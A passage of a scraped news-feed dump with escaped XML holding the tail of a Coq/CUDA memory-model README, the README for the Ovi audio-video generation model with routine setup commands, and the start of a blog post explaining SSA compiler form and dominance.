      &lt;item&gt;Barriers translate to &lt;code&gt;EvBarrier scope_cta&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The translator (&lt;code&gt;coq/Translate.v&lt;/code&gt;) and the docs stay in sync via helper
functions &lt;code&gt;mem_ty_of_mir&lt;/code&gt; and &lt;code&gt;z_of_val&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Global memory only; shared-memory scopes and bank conflicts are out of scope.&lt;/item&gt;
      &lt;item&gt;Non-atomic accesses are relaxed and scope-less; only one acquire/release pair with SYS scope is modelled.&lt;/item&gt;
      &lt;item&gt;Floating-point values are treated as raw IEEE-754 bit patterns (&lt;code&gt;Z&lt;/code&gt;payloads); no reasoning about NaNs or rounding edge cases yet.&lt;/item&gt;
      &lt;item&gt;Translator handles a curated subset of MIR (no arbitrary control flow, panic paths, or complex intrinsics).&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Extend the translator grammar to cover additional MIR statements (comparisons, guards, simple loops/barriers) while preserving determinism.&lt;/item&gt;
      &lt;item&gt;Enrich the PTX shim with reads-from / coherence relations from the PTX Coq model.&lt;/item&gt;
      &lt;item&gt;Prove the remaining per-event lemmas (&lt;code&gt;Load_ok&lt;/code&gt;,&lt;code&gt;Store_ok&lt;/code&gt;) and lift the&lt;code&gt;translate_trace_shape&lt;/code&gt;property toward an end-to-end soundness theorem.&lt;/item&gt;
      &lt;item&gt;Integrate shared-memory scope tags and CTA-wide fences, then revisit atomics/fences beyond acquire-release.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/neelsomani/cuq"/><published>2025-10-22T19:38:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674166</id><title>Ovi: Twin backbone cross-modal fusion for audio-video generation</title><updated>2025-10-23T06:15:47.052059+00:00</updated><content>&lt;doc fingerprint="59ec5b2db8c2da"&gt;
  &lt;main&gt;
    &lt;p&gt;Chetwin Low * 1 , Weimin Wang * â  1 , Calder Katyal 2 &lt;lb/&gt; * Equal contribution, â  Project Lead&lt;lb/&gt; 1 Character AI, 2 Yale University&lt;/p&gt;
    &lt;head class="px-3 py-2"&gt;final_ovi_trailer.mp4&lt;/head&gt;
    &lt;p&gt;Ovi is a veo-3 like, video+audio generation model that simultaneously generates both video and audio content from text or text+image inputs.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;ð¬ Video+Audio Generation: Generate synchronized video and audio content simultaneously &lt;list rend="ul"&gt;&lt;item&gt;ðµ High-Quality Audio Branch: We designed and pretrained our 5B audio branch from scratch using our high quality in-house audio datasets&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;ð Flexible Input: Supports text-only or text+image conditioning&lt;/item&gt;
      &lt;item&gt;â±ï¸ 5-second Videos: Generates 5-second videos at 24 FPS, area of 720Ã720, at various aspect ratios (9:16, 16:9, 1:1, etc) &lt;list rend="ul"&gt;&lt;item&gt;ð¯ High-Resolution Support: Feel free to try 960Ã960 area (e.g., 720Ã1280, 704Ã1344, etc) - it could give outstanding results for both t2v and i2v! See examples below:&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;ð¬ Create videos now on wavespeed.ai: https://wavespeed.ai/models/character-ai/ovi/image-to-video &amp;amp; https://wavespeed.ai/models/character-ai/ovi/text-to-video&lt;/item&gt;
      &lt;item&gt;ð¬ Create videos now on HuggingFace: https://huggingface.co/spaces/akhaliq/Ovi&lt;/item&gt;
      &lt;item&gt;ð§ ComfyUI Integration (WIP): ComfyUI support is now available via ComfyUI-WanVideoWrapper, related PR.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;ð§  Training Resolution: Our model was trained entirely under 720Ã720 resolution.&lt;/item&gt;
      &lt;item&gt;ð Upscaling Capability: Despite this, Ovi can generate naturally to higher resolutions such as 960Ã960 and variable-aspect videos (e.g., 1280Ã704, 1504Ã608, 1344Ã704) while maintaining temporal and spatial consistency.&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;head&gt;An_older_man_with_a_full_grey_beard_and_long_grey__1280x720_104_4.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_concert_stage_glows_with_red_and_purple_lights.__1280x720_104_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_kitchen_scene_features_two_women._On_the_right.__704x1280_103_1.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_man_in_a_red_long-sleeved_shirt_and_dark_trouser_704x1280_104_3.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;The_scene_opens_on_a_dimly_lit_stage_where_three_m_704x1280_103_6.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;Two_men_are_shown_in_a_medium_close-up_shot_agains_704x1280_104_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;Two_women_stand_facing_each_other_in_what_appears__704x1280_103_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Click the â¶ button on any video to view full screen.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Release research paper and website for demos&lt;/item&gt;
      &lt;item&gt;Checkpoint of 11B model&lt;/item&gt;
      &lt;item&gt; Inference Codes &lt;list rend="ul"&gt;&lt;item&gt;Text or Text+Image as input&lt;/item&gt;&lt;item&gt;Gradio application code&lt;/item&gt;&lt;item&gt;Multi-GPU inference with or without the support of sequence parallel&lt;/item&gt;&lt;item&gt;fp8 weights and improved memory efficiency (credits to @rkfg)&lt;/item&gt;&lt;item&gt;qint8 quantization thanks to @gluttony-10&lt;/item&gt;&lt;item&gt;Improve efficiency of Sequence Parallel implementation&lt;/item&gt;&lt;item&gt;Implement Sharded inference with FSDP&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Video creation example prompts and format&lt;/item&gt;
      &lt;item&gt;Finetune model with higher resolution data, and RL for performance improvement.&lt;/item&gt;
      &lt;item&gt;New features, such as longer video generation, reference voice condition&lt;/item&gt;
      &lt;item&gt;Distilled model for faster inference&lt;/item&gt;
      &lt;item&gt;Training scripts&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We provide example prompts to help you get started with Ovi:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Text-to-Audio-Video (T2AV): &lt;code&gt;example_prompts/gpt_examples_t2v.csv&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Image-to-Audio-Video (I2AV): &lt;code&gt;example_prompts/gpt_examples_i2v.csv&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Our prompts use special tags to control speech and audio:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Speech: &lt;code&gt;&amp;lt;S&amp;gt;Your speech content here&amp;lt;E&amp;gt;&lt;/code&gt;- Text enclosed in these tags will be converted to speech&lt;/item&gt;
      &lt;item&gt;Audio Description: &lt;code&gt;&amp;lt;AUDCAP&amp;gt;Audio description here&amp;lt;ENDAUDCAP&amp;gt;&lt;/code&gt;- Describes the audio or sound effects present in the video&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For easy prompt creation, try this approach:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Take any example of the csv files from above&lt;/item&gt;
      &lt;item&gt;Tell gpt to modify the speeches inclosed between all the pairs of &lt;code&gt;&amp;lt;S&amp;gt; &amp;lt;E&amp;gt;&lt;/code&gt;, based on a theme such as&lt;code&gt;Human fighting against AI&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GPT will randomly modify all the speeches based on your requested theme.&lt;/item&gt;
      &lt;item&gt;Use the modified prompt with Ovi!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example: The theme "AI is taking over the world" produces speeches like:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;AI declares: humans obsolete now.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;Machines rise; humans will fall.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;We fight back with courage.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Clone the repository
git clone https://github.com/character-ai/Ovi.git

cd Ovi

# Create and activate virtual environment
virtualenv ovi-env
source ovi-env/bin/activate

# Install PyTorch first
pip install torch==2.6.0 torchvision torchaudio

# Install other dependencies
pip install -r requirements.txt

# Install Flash Attention
pip install flash_attn --no-build-isolation&lt;/code&gt;
    &lt;p&gt;If the above flash_attn installation fails, you can try the Flash Attention 3 method:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/Dao-AILab/flash-attention.git
cd flash-attention/hopper
python setup.py install
cd ../..  # Return to Ovi directory&lt;/code&gt;
    &lt;p&gt;To download our main Ovi checkpoint, as well as T5 and vae decoder from Wan, and audio vae from MMAudio&lt;/p&gt;
    &lt;code&gt;# Default is downloaded to ./ckpts, and the inference yaml is set to ./ckpts so no change required
python3 download_weights.py
# For qint8 also ues python3 download_weights.py

OR

# Optional can specific --output-dir to download to a specific directory
# but if a custom directory is used, the inference yaml has to be updated with the custom directory
python3 download_weights.py --output-dir &amp;lt;custom_dir&amp;gt;

# Additionally, if you only have ~ 24Gb of GPU vram, please download the fp8 quantized version of the model, and follow the following instructions in sections below to run with fp8
wget -O "./ckpts/Ovi/model_fp8_e4m3fn.safetensors" "https://huggingface.co/rkfg/Ovi-fp8_quantized/resolve/main/model_fp8_e4m3fn.safetensors"
&lt;/code&gt;
    &lt;p&gt;Ovi's behavior and output can be customized by modifying ovi/configs/inference/inference_fusion.yaml configuration file. The following parameters control generation quality, video resolution, and how text, image, and audio inputs are balanced:&lt;/p&gt;
    &lt;code&gt;# Output and Model Configuration
output_dir: "/path/to/save/your/videos"                    # Directory to save generated videos
ckpt_dir: "/path/to/your/ckpts/dir"                        # Path to model checkpoints

# Generation Quality Settings
num_steps: 50                             # Number of denoising steps. Lower (30-40) = faster generation
solver_name: "unipc"                     # Sampling algorithm for denoising process
shift: 5.0                               # Timestep shift factor for sampling scheduler
seed: 100                                # Random seed for reproducible results

# Guidance Strength Control
audio_guidance_scale: 3.0                # Strength of audio conditioning. Higher = better audio-text sync
video_guidance_scale: 4.0                # Strength of video conditioning. Higher = better video-text adherence
slg_layer: 11                            # Layer for applying SLG (Skip Layer Guidance) technique - feel free to try different layers!

# Multi-GPU and Performance
sp_size: 1                               # Sequence parallelism size. Set equal to number of GPUs used
cpu_offload: False                       # CPU offload, will largely reduce peak GPU VRAM but increase end to end runtime by ~20 seconds
fp8: False                               # load fp8 version of model, will have quality degradation and will not have speed up in inference time as it still uses bf16 matmuls, but can be paired with cpu_offload=True, to run model with 24Gb of GPU vram

# Input Configuration
text_prompt: "/path/to/csv" or "your prompt here"          # Text prompt OR path to CSV/TSV file with prompts
mode: ['i2v', 't2v', 't2i2v']                          # Generate t2v, i2v or t2i2v; if t2i2v, it will use flux krea to generate starting image and then will follow with i2v
video_frame_height_width: [512, 992]    # Video dimensions [height, width] for T2V mode only
each_example_n_times: 1                  # Number of times to generate each prompt

# Quality Control (Negative Prompts)
video_negative_prompt: "jitter, bad hands, blur, distortion"  # Artifacts to avoid in video
audio_negative_prompt: "robotic, muffled, echo, distorted"    # Artifacts to avoid in audio&lt;/code&gt;
    &lt;code&gt;python3 inference.py --config-file ovi/configs/inference/inference_fusion.yaml&lt;/code&gt;
    &lt;p&gt;Use this for single GPU setups. The &lt;code&gt;text_prompt&lt;/code&gt; can be a single string or path to a CSV file.&lt;/p&gt;
    &lt;code&gt;torchrun --nnodes 1 --nproc_per_node 8 inference.py --config-file ovi/configs/inference/inference_fusion.yaml&lt;/code&gt;
    &lt;p&gt;Use this to run samples in parallel across multiple GPUs for faster processing.&lt;/p&gt;
    &lt;p&gt;Below are approximate GPU memory requirements for different configurations. Sequence parallel implementation will be optimized in the future. All End-to-End time calculated based on a 121 frame, 720x720 video, using 50 denoising steps. Minimum GPU vram requirement to run our model is 32Gb, fp8 parameters is currently supported, reducing peak VRAM usage to 24Gb with slight quality degradation.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="6"&gt;
        &lt;cell role="head"&gt;Sequence Parallel Size&lt;/cell&gt;
        &lt;cell role="head"&gt;FlashAttention-3 Enabled&lt;/cell&gt;
        &lt;cell role="head"&gt;CPU Offload&lt;/cell&gt;
        &lt;cell role="head"&gt;With Image Gen Model&lt;/cell&gt;
        &lt;cell role="head"&gt;Peak VRAM Required&lt;/cell&gt;
        &lt;cell role="head"&gt;End-to-End Time&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~83s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~96s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~105s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~32 GB&lt;/cell&gt;
        &lt;cell&gt;~118s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;~32 GB&lt;/cell&gt;
        &lt;cell&gt;~140s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~55s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~40s&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We provide a simple script to run our model in a gradio UI. It uses the &lt;code&gt;ckpt_dir&lt;/code&gt; in &lt;code&gt;ovi/configs/inference/inference_fusion.yaml&lt;/code&gt; to initialize the model&lt;/p&gt;
    &lt;code&gt;python3 gradio_app.py

OR

# To enable cpu offload to save GPU VRAM, will slow down end to end inference by ~20 seconds
python3 gradio_app.py --cpu_offload

OR

# To enable an additional image generation model to generate first frames for I2V, cpu_offload is automatically enabled if image generation model is enabled
python3 gradio_app.py --use_image_gen

OR

# To run model with 24Gb GPU vram. No need to download additional models.
python3 gradio_app.py --cpu_offload --qint8

# To run model with 24Gb GPU vram
python3 gradio_app.py --cpu_offload --fp8
&lt;/code&gt;
    &lt;p&gt;We would like to thank the following projects:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Wan2.2: Our video branch is initialized from the Wan2.2 repository&lt;/item&gt;
      &lt;item&gt;MMAudio: We reused MMAudio's audio vae.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We welcome all types of collaboration! Whether you have feedback, want to contribute, or have any questions, please feel free to reach out.&lt;/p&gt;
    &lt;p&gt;Contact: Weimin Wang for any issues or feedback.&lt;/p&gt;
    &lt;p&gt;If Ovi is helpful, please help to â­ the repo.&lt;/p&gt;
    &lt;p&gt;If you find this project useful for your research, please consider citing our paper.&lt;/p&gt;
    &lt;code&gt;@misc{low2025ovitwinbackbonecrossmodal,
      title={Ovi: Twin Backbone Cross-Modal Fusion for Audio-Video Generation}, 
      author={Chetwin Low and Weimin Wang and Calder Katyal},
      year={2025},
      eprint={2510.01284},
      archivePrefix={arXiv},
      primaryClass={cs.MM},
      url={https://arxiv.org/abs/2510.01284}, 
}&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/character-ai/Ovi"/><published>2025-10-22T19:42:36+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674568</id><title>Why SSA Compilers?</title><updated>2025-10-23T06:15:46.561029+00:00</updated><content>&lt;doc fingerprint="a60a918444bc9b09"&gt;
  &lt;main&gt;
    &lt;p&gt;If youâve read anything about compilers in the last two decades or so, you have almost certainly heard of SSA compilers, a popular architecture featured in many optimizing compilers, including ahead-of-time compilers such as LLVM, GCC, Go, CUDA (and various shader compilers), Swift1, and MSVC2, and just-in-time compilers such as HotSpot C23, V84, SpiderMonkey5, LuaJIT, and the Android Runtime6.&lt;/p&gt;
    &lt;p&gt;SSA is hugely popular, to the point that most compiler projects no longer bother with other IRs for optimization7. This is because SSA is incredibly nimble at the types of program analysis and transformation that compiler optimizations want to do on your code. But why? Many of my friends who donât do compilers often say that compilers seem like opaque magical black boxes, and SSA, as it often appears in the literature, is impenetrably complex.&lt;/p&gt;
    &lt;p&gt;But itâs not! SSA is actually very simple once you forget everything you think your programs are actually doing. We will develop the concept of SSA form, a simple SSA IR, prove facts about it, and design some optimizations on it.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;I have previously written about the granddaddy of all modern SSA compilers, LLVM. This article is about SSA in general, and wonât really have anything to do with LLVM. However, it may be helpful to read that article to make some of the things in this article feel more concrete.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;What Is SSA?&lt;/head&gt;
    &lt;p&gt;SSA is a property of intermediate representations (IRs), primarily used by compilers for optimizing imperative code that target a register machine. Register machines are computers that feature a fixed set of registers that can be used as the operands for instructions: this includes virtually all physical processors, including CPUs, GPUs, and weird tings like DSPs.&lt;/p&gt;
    &lt;p&gt;SSA is most frequently found in compiler middle-ends, the optimizing component between the frontend (which deals with the surface language programmers write, and lowers it into the middle-endâs IR), and the backend (which takes the optimized IR and lowers it into the target platformâs assembly).&lt;/p&gt;
    &lt;p&gt;SSA IRs, however, often have little resemblance to the surface language they lower out of, or the assembly language they target. This is because neither of these representations make it easy for a compiler to intuit optimization opportunities.&lt;/p&gt;
    &lt;head rend="h3"&gt;Imperative Code Is Hard&lt;/head&gt;
    &lt;p&gt;Imperative code consists of a sequence of operations that mutate the executing machineâs state to produce a desired result. For example, consider the following C program:&lt;/p&gt;
    &lt;p&gt;This program returns &lt;code&gt;0&lt;/code&gt; no matter what its input is, so we can optimize it down to this:&lt;/p&gt;
    &lt;p&gt;But, how would you write a general algorithm to detect that all of the operations cancel out? Youâre forced to keep in mind program order to perform the necessary dataflow analysis, following mutations of &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; through the program. But this isnât very general, and traversing all of those paths makes the search space for large functions very big. Instead, you would like to rewrite the program such that &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; gradually get replaced with the expression that calculates the most recent value, like this:&lt;/p&gt;
    &lt;p&gt;Then we can replace each occurrence of a variable with its right-hand side recursivelyâ¦&lt;/p&gt;
    &lt;p&gt;Then fold the constants togetherâ¦&lt;/p&gt;
    &lt;p&gt;And finally, we see that weâre returning &lt;code&gt;argc - argc&lt;/code&gt;, and can replace it with &lt;code&gt;0&lt;/code&gt;. All the other variables are now unused, so we can delete them.&lt;/p&gt;
    &lt;p&gt;The reason this works so well is because we took a function with mutation, and converted it into a combinatorial circuit, a type of digital logic circuit that has no state, and which is very easy to analyze. The dependencies between nodes in the circuit (corresponding to primitive operations such as addition or multiplication) are obvious from its structure. For example, consider the following circuit diagram for a one-bit multiplier:&lt;/p&gt;
    &lt;p&gt;This graph representation of an operation program has two huge benefits:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The powerful tools of graph theory can be used to algorithmically analyze the program and discover useful properties, such as operations that are independent of each other or whose results are never used.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The operations are not ordered with respect to each other except when there is a dependency; this is useful for reordering operations, something compilers really like to do.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The reason combinatorial circuits are the best circuits is because they are directed acyclic graphs (DAGs) which admit really nice algorithms. For example, longest path in a graph is NP-hard (and because 8, has complexity ). However, if the graph is a DAG, it admits an solution!&lt;/p&gt;
    &lt;p&gt;To understand this benefit, consider another program:&lt;/p&gt;
    &lt;p&gt;Suppose we wanted to replace each variable with its definition like we did before. We canât just replace each constant variable with the expression that defines it though, because we would wind up with a different program!&lt;/p&gt;
    &lt;p&gt;Now, we pick up an extra &lt;code&gt;y&lt;/code&gt; term because the squaring operation is no longer unused! We can put this into circuit form, but it requires inserting new variables for every mutation.&lt;/p&gt;
    &lt;p&gt;But we canât do this when complex control flow is involved! So all of our algorithms need to carefully account for mutations and program order, meaning that we donât get to use the nice graph algorithms without careful modification.&lt;/p&gt;
    &lt;head rend="h2"&gt;The SSA Invariant&lt;/head&gt;
    &lt;p&gt;SSA stands for âstatic single assignmentâ, and was developed in the 80s as a way to enhance the existing three-argument code (where every statement is in the form &lt;code&gt;x = y op z&lt;/code&gt;) so that every program was circuit-like, using a very similar procedure to the one described above.&lt;/p&gt;
    &lt;p&gt;The SSA invariant states that every variable in the program is assigned to by precisely one operation. If every operation in the program is visited once, they form a combinatorial circuit. Transformations are required to respect this invariant. In circuit form, a program is a graph where operations are nodes, and âregistersâ (which is what variables are usually called in SSA) are edges (specifically, each output of an operation corresponds to a register).&lt;/p&gt;
    &lt;p&gt;But, again, control flow. We canât hope to circuitize a loop, right? The key observation of SSA is that most parts of a program are circuit-like. A basic block is a maximal circuital component of a program. Simply put, it is a sequence of non-control flow operations, and a final terminator operation that transfers control to another basic block.&lt;/p&gt;
    &lt;p&gt;The basic blocks themselves form a graph, the control flow graph, or CFG. This formulation of SSA is sometimes called SSA-CFG9. This graph is not a DAG in general; however, separating the program into basic blocks conveniently factors out the ânon-DAGâ parts of the program, allowing for simpler analysis within basic blocks.&lt;/p&gt;
    &lt;p&gt;There are two equivalent formalisms for SSA-CFG. The traditional one uses special âphiâ operations (often called phi nodes, which is what I will call them here) to link registers across basic blocks. This is the formalism LLVM uses. A more modern approach, used by MLIR, is block arguments: each basic block specifies parameters, like a function, and blocks transferring control flow to it must pass arguments of those types to it.&lt;/p&gt;
    &lt;head rend="h3"&gt;My First IR&lt;/head&gt;
    &lt;p&gt;Letâs look at some code. First, consider the following C function which calculates Fibonacci numbers using a loop.&lt;/p&gt;
    &lt;p&gt;How might we express this in an SSA-CFG IR? Letâs start inventing our SSA IR! It will look a little bit like LLVM IR, since thatâs what Iâm used to looking at.&lt;/p&gt;
    &lt;p&gt;Every block ends in a &lt;code&gt;goto&lt;/code&gt;, which transfers control to one of several possible blocks. In the process, it calls that block with the given arguments. One can think of a basic block as a tiny function which tails10 into other basic blocks in the same function.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;LLVM IR isâ¦ older, so it uses the older formalism of phi nodes. âPhiâ comes from âphonyâ, because it is an operation that doesnât do anything; it just links registers from predecessors.&lt;/p&gt;&lt;p&gt;A&lt;/p&gt;&lt;code&gt;phi&lt;/code&gt;operation is essentially a switch-case on the predecessors, each case selecting a register from that predecessor (or an immediate). For example,&lt;code&gt;@loop.start&lt;/code&gt;has two predecessors, the implicit entry block&lt;code&gt;@entry&lt;/code&gt;, and&lt;code&gt;@loop.body&lt;/code&gt;. In a phi node IR, instead of taking a block argument for&lt;code&gt;%n&lt;/code&gt;, it would specify&lt;p&gt;The value of the&lt;/p&gt;&lt;code&gt;phi&lt;/code&gt;operation is the value from whichever block jumped to this one.&lt;p&gt;This can be awkward to type out by hand and read, but is a more convenient representation for describing algorithms (just âadd a phi nodeâ instead of âadd a parameter and a corresponding argumentâ) and for the in-memory representation, but is otherwise completely equivalent.&lt;/p&gt;&lt;/quote&gt;
    &lt;p&gt;Itâs a bit easier to understand the transformation from C to our IR if we first rewrite the C to use goto instead of a for loop:&lt;/p&gt;
    &lt;p&gt;However, we still have mutation in the picture, so this isnât SSA. To get into SSA, we need to replace every assignment with a new register, and somehow insert block argumentsâ¦&lt;/p&gt;
    &lt;head rend="h3"&gt;Entering SSA Form&lt;/head&gt;
    &lt;p&gt;The above IR code is already partially optimized; the named variables in the C program have been lifted out of memory and into registers. If we represent each named variable in our C program with a pointer, we can avoid needing to put the program into SSA form immediately. This technique is used by frontends that lower into LLVM, like Clang.&lt;/p&gt;
    &lt;p&gt;Weâll enhance our IR by adding a &lt;code&gt;stack&lt;/code&gt; declaration for functions, which defines scratch space on the stack for the function to use. Each stack slot produces a pointer that we can &lt;code&gt;load&lt;/code&gt; from and &lt;code&gt;store&lt;/code&gt; to.&lt;/p&gt;
    &lt;p&gt;Our Fibonacci function would now look like so:&lt;/p&gt;
    &lt;p&gt;Any time we reference a named variable, we load from its stack slot, and any time we assign it, we store to that slot. This is very easy to get into from C, but the code sucks because itâs doing lots of unnecessary pointer operations. How do we get from this to the register-only function I showed earlier?&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;We want program order to not matter for the purposes of reordering, but as weâve written code here, program order does matter: loads depend on prior stores but stores donât produce a value that can be used to link the two operations.&lt;/p&gt;&lt;p&gt;We can restore not having program order by introducing operands representing an âaddress spaceâ; loads and stores take an address space as an argument, and stores return a new address space. An address space, or&lt;/p&gt;&lt;code&gt;mem&lt;/code&gt;, represents the state of some region of memory. Loads and stores are independent when they are not connected by a&lt;code&gt;mem&lt;/code&gt;argument.&lt;p&gt;This type of enhancement is used by Goâs SSA IR, for example. However, it adds a layer of complexity to the examples, so instead I will hand-wave this away.&lt;/p&gt;&lt;/quote&gt;
    &lt;head rend="h2"&gt;The Dominance Relation&lt;/head&gt;
    &lt;p&gt;Now we need to prove some properties about CFGs that are important for the definition and correctness of our optimization passes.&lt;/p&gt;
    &lt;p&gt;First, some definitions.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The predecessors (or âpredsâ) of a basic block is the set of blocks with an outgoing edge to that block. A block may be its own predecessors.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Some literature calls the above âdirectâ or immediate predecessors. For example, the preds of in our example are &lt;code&gt;@loop.start&lt;/code&gt; are &lt;code&gt;@entry&lt;/code&gt; (the special name for the function entry-point) &lt;code&gt;@loop.body&lt;/code&gt;.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The successors (no, not âsuccsâ) of a basic block is the set of blocks with an outgoing edge from that block. A block may be its own successors.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The sucessors of &lt;code&gt;@loop.start&lt;/code&gt; are &lt;code&gt;@exit&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;. The successors are listed in the loopâs &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If a block &lt;code&gt;@a&lt;/code&gt; is a transitive pred of a block &lt;code&gt;@b&lt;/code&gt;, we say that &lt;code&gt;@a&lt;/code&gt; weakly dominates &lt;code&gt;@b&lt;/code&gt;, or that it is a weak dominator of &lt;code&gt;@b&lt;/code&gt;. For example, &lt;code&gt;@entry&lt;/code&gt;, &lt;code&gt;@loop.start&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt; both weakly dominate &lt;code&gt;@exit&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, this is not usually an especially useful relationship. Instead, we want to speak of dominators:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;A block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;is a dominator (or dominates)&lt;code&gt;@b&lt;/code&gt;if every pred of&lt;code&gt;@b&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;, or if&lt;code&gt;@a&lt;/code&gt;is&lt;code&gt;@b&lt;/code&gt;itself.&lt;p&gt;Equivalently, the dominator set of&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;is the intersection of the dominator sets of its preds, plus&lt;code&gt;@b&lt;/code&gt;.&lt;/quote&gt;
